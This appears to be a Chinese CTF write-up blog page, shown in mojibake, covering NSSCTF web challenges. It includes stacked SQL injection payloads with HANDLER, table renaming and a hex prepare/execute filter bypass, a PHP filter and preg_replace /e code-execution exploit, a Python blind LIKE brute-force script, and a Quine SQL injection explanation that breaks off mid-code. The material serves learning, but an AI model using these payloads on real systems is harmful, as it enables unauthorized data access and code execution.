2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p>sqlæ³¨å…¥é¢˜</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081543495.png" alt="image-20241201081543495"></p><p>å­˜åœ¨è¿‡æ»¤ï¼Œä¸å¥½ç›´æ¥è”åˆæ³¨å…¥å•Š</p><p>è¯•è¯•å †å </p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081821727.png" alt="image-20241201081821727" style="zoom:67%;" /><p>å­˜åœ¨å †å æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br><span class="line">1&#x27;;show tables;#</span><br><span class="line">1&#x27;;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081952743.png" alt="image-20241201081952743" style="zoom:67%;" /><p>ä½†æ˜¯è¿™é‡Œselectç­‰è¢«è¿‡æ»¤äº†ï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><blockquote><p>mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚</p></blockquote><blockquote><p>é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚<br>é€šè¿‡HANDLER tbl_name READ FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚<br>é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚</p><p>é€šè¿‡ç´¢å¼•å»æŸ¥çœ‹çš„è¯å¯ä»¥æŒ‰ç…§ä¸€å®šçš„é¡ºåºï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ã€‚<br>é€šè¿‡HANDLER tbl_name READ index_name FIRSTï¼Œè·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼ŒNEXTè·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;#</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082223713.png" alt="image-20241201082223713"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;64bfe910-ba05-4133-8fdf-11bdf68fd5ce&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä¸ºç¬¬ä¸€ç§æ–¹æ³•</p><p>è¿˜æœ‰ä¸¤ç§æ€è·¯ï¼ï¼ï¼</p><p><strong>æ–¹æ³•ä¸€ï¼š</strong></p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082453677.png" alt="image-20241201082453677" style="zoom:67%;" /><p>ç›´æ¥æŸ¥1ï¼Œæœåˆ°çš„æ˜¯wordsè¡¨çš„ç›¸å…³å†…å®¹ï¼Œè€Œæœä¸åˆ°flagè¡¨çš„ç›¸å…³å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä¸å¯ä»¥æŠŠflagè¡¨å˜æˆwordsè¡¨å‘¢ï¼Œé‚£ä¸å°±å¯ä»¥ç›´æ¥æœåˆ°flagè¡¨çš„å†…å®¹äº†å—ï¼Ÿï¼</p><blockquote><p>1ï¼Œé€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚</p><p>2ï¼ŒæŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚</p><p>3 ï¼Œç»™æ–° words è¡¨æ·»åŠ æ–°çš„åˆ—å id ã€‚</p><p>4ï¼Œå°† flag æ”¹åä¸º data ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082658543.png" alt="image-20241201082658543"></p><p><strong>æ–¹æ³•äºŒï¼š</strong></p><blockquote><p>å› ä¸ºselectè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å…ˆå°†select * from <code>1919810931114514</code>è¿›è¡Œ16è¿›åˆ¶ç¼–ç </p><p>å†é€šè¿‡æ„é€ payloadå¾—</p><p>1â€™;SeT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</p><p>è¿›è€Œå¾—åˆ°flag</p></blockquote><p>prepareâ€¦fromâ€¦æ˜¯é¢„å¤„ç†è¯­å¥ï¼Œä¼šè¿›è¡Œç¼–ç è½¬æ¢ã€‚</p><p>executeç”¨æ¥æ‰§è¡Œç”±SQLPrepareåˆ›å»ºçš„SQLè¯­å¥ã€‚</p><p>SELECTå¯ä»¥åœ¨ä¸€æ¡è¯­å¥é‡Œå¯¹å¤šä¸ªå˜é‡åŒæ—¶èµ‹å€¼,è€ŒSETåªèƒ½ä¸€æ¬¡å¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼ã€‚</p><h2 id="BJDCTF-2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF-2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF 2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF 2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28418/?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬æ¥è¯•äº†ä¸€ä¸‹filterchainï¼Œå¯ä»¥ç”¨æ˜¯å¯ä»¥ç”¨ä½†æ˜¯flagå‡ºä¸æ¥ï¼Œå¯èƒ½è¢«ç‰¹æ„è®¾è®¡äº†</p><p>è¿™é‡Œä¸»è¦æ¶‰åŠåˆ°<code>preg_replace</code>çš„ä¸€ä¸ªRCEæ¼æ´ï¼Œå‚è€ƒï¼š<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><p>ä¸»è¦å°±æ˜¯æ„é€ <code>preg_replace(&#39;.*&#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;, &#123;$&#123;æ­¤å¤„å¡«å‡½æ•°å&#125;&#125;);</code><br> å¤§æ¦‚å°±æ˜¯æŠŠæ‰€æœ‰å­—ç¬¦æ›¿æ¢ä¸ºå‡½æ•°æ‰§è¡Œç»“æœã€‚<br> ä½†æ˜¯GETä¼ <code>.*=xxx</code>ä¼šå‡ºé—®é¢˜ï¼Œè‡ªåŠ¨å°†ç¬¬ä¸€ä¸ªéæ³•å­—ç¬¦è½¬åŒ–ä¸ºä¸‹åˆ’çº¿ï¼ˆçœ‹é“¾æ¥ï¼‰ï¼Œæ‰€ä»¥æ„é€ ï¼š</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201090321285.png" alt="image-20241201090321285" style="zoom: 67%;" /><p>è¿™é‡Œæ²¡æœ‰å‡ºflagï¼Œé‚£å°±æ˜¯ç¯å¢ƒé—®é¢˜äº†ï¼Œä¹‹å‰çš„filterchainåº”è¯¥ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ï¼</p><h2 id="NISACTF-2022-hardsql"><a href="#NISACTF-2022-hardsql" class="headerlink" title="[NISACTF 2022]hardsql"></a>[NISACTF 2022]hardsql</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=_POST[â€˜passwdâ€™];</span><br><span class="line">sql=&quot;SELECT passwd FROM users WHERE username=â€²bilalaâ€² and passwd=â€²passwordâ€™;&quot;;</span><br></pre></td></tr></table></figure><p>æ ¹æ®é¢˜ç›®æè¿°ï¼Œusernameä¸ºbilalaï¼Œpasswordå¤„å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå¯ä»¥è¿›è¡Œsqlæ³¨å…¥æµ‹è¯•ã€‚</p><p>å…ˆfuzzä¸€ä¸‹ï¼Œå­˜åœ¨waf</p><p>å‘ç°likeå’Œç™¾åˆ†å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œç›´æ¥çˆ†ç ´å¯†ç äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node5.anna.nssctf.cn:23092/login.php&#x27;</span></span><br><span class="line">str_sum=string.digits+string.ascii_letters</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str_sum:</span><br><span class="line">        data=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;bilala&quot;</span>,<span class="string">&quot;passwd&quot;</span>:<span class="string">f&quot;-1&#x27;/**/or/**/passwd/**/like/**/&#x27;<span class="subst">&#123;flag+j&#125;</span>%&#x27;#&quot;</span>&#125;</span><br><span class="line">        res=requests.post(url,data)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;nothing&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b2f2d15b3ae082ca29697d8dcd420fd7</span><br></pre></td></tr></table></figure><p>ç™»é™†æˆåŠŸåæºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//å¤šåŠ äº†äº¿ç‚¹ç‚¹è¿‡æ»¤</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/if|regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&amp;|;|\\\$|char|\x0a|\x09|column|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;waf here&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;bilala&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only bilala can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$MysqlLink</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;nothing found&#x27;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> == <span class="string">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é‡ç‚¹åœ¨æ­¤å¤„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> == <span class="string">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>è€ƒç‚¹ä¸ºsqlæ³¨å…¥ä¹‹Quineæ³¨å…¥</p><p><strong>è¿™é‡Œå…ˆä»‹ç»ä¸€ä¸‹Quineæ³¨å…¥ï¼š</strong></p><p><a href="https://nakaii.top/2023/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1Quino%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html">https://nakaii.top/2023/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1Quino%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html</a></p><p>Quineåˆç§°ä¸ºè‡ªäº§ç”Ÿç¨‹åºï¼Œåœ¨sqlæ³¨å…¥ä¸­æ˜¯ä¸€ç§ä½¿å¾—è¾“å…¥çš„sqlè¯­å¥å’Œè¾“å‡ºçš„sqlè¯­å¥ä¸€è‡´çš„æŠ€æœ¯ï¼Œå°±æ˜¯è¯´è¾“å…¥çš„è¯­å¥è¿›è¡ŒæŸ¥è¯¢åç”Ÿæˆçš„ç»“æœä¸è¾“å…¥çš„è¯­å¥ç›¸åŒï¼ˆè‡ªå·±ç”Ÿæˆè‡ªå·±ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°é¢˜ç›®ä¸­çš„åˆ¤æ–­æ­£æ˜¯è€ƒå¯Ÿäº†è¿™ä¸ªç‚¹ã€‚</p><p>çªç ´å£æ˜¯replaceå‡½æ•°</p><blockquote><p>replace(object, search, replace)</p></blockquote><p>æ­¤å‡½æ•°ç”¨äºå°†objectä¸­çš„æ‰€æœ‰searchæ›¿æ¢ä¸ºreplaceã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(&quot;.&quot;, char(46), &quot;!&quot;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| replace(&quot;.&quot;, char(46), &quot;!&quot;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| !                           |</span><br><span class="line">+-----------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure><p><strong>å°è¯•ä½¿è¾“å…¥è¾“å‡ºä¿æŒä¸€è‡´ï¼</strong></p><p><strong>æ›¿æ¢object</strong></p><p>å°è¯•é€šè¿‡æ›¿æ¢objectä½¿è¾“å…¥è¾“å‡ºä¿æŒä¸€è‡´:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;.&#x27;);</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;.&#x27;) |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| replace(&quot;.&quot;,char(46),&quot;.&quot;)                         |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å·®ä¸€ç‚¹ï¼Œåªæ˜¯å°†objectä¸­çš„å­—ç¬¦ä¸²åŸæ ·è¾“å‡ºäº†ï¼Œreplaceè¿˜æ²¡æ€ä¹ˆç”¨åˆ°ï¼Œæ˜¯å¦å¯ä»¥é€šè¿‡æ›´æ”¹replaceä½¿è¾“å…¥è¾“å‡ºä¿æŒä¸€è‡´ï¼Ÿ</p><p><strong>æ›¿æ¢object+replace</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;);</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç¡®å®é•¿å¾—å·®ä¸å¤šäº†ï¼Œä½†è¿˜æ˜¯æœ‰é—®é¢˜ï¼ŒåŒ…å›´objectå’Œreplaceçš„ç¬¦å·ä»ç„¶æœ‰å·®å¼‚ã€‚objectä¸­çš„.è¢«æ›¿æ¢ä¸ºäº†replace(â€œ.â€,char(46),â€.â€),ä½†åŒ…å›´.çš„å¼•å·ä¸ºåŒå¼•å·ï¼Œå¦‚æœç›´æ¥æ›´æ”¹ä¸ºå•å¼•å·ä¼šé€ æˆæœ€å¤–å±‚replaceçš„objectç•Œé™ä¸æ˜ç¡®ï¼Œå› æ­¤è¿˜éœ€è¦å†å¥—ä¸€å±‚replaceï¼Œå°†åŒå¼•å·æ”¹ä¸ºå•å¼•å·ã€‚</p><p><strong>è§£å†³å¼•å·é—®é¢˜</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(&#x27;&quot;.&quot;&#x27;,char(34),char(39))</span><br></pre></td></tr></table></figure><p>è¯­å¥å°†å­—ç¬¦ä¸²ä¸­çš„åŒå¼•å·æ›¿æ¢ä¸ºäº†å•å¼•å·ï¼Œè¿™å°±æ˜¯è§£å†³å¼•å·é—®é¢˜çš„æ–¹æ³•ï¼Œå³åœ¨objectå¤–å†å¥—ä¸€å±‚replaceå°†é‡Œé¢çš„åŒå¼•å·æ›´æ”¹ä¸ºå•å¼•å·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 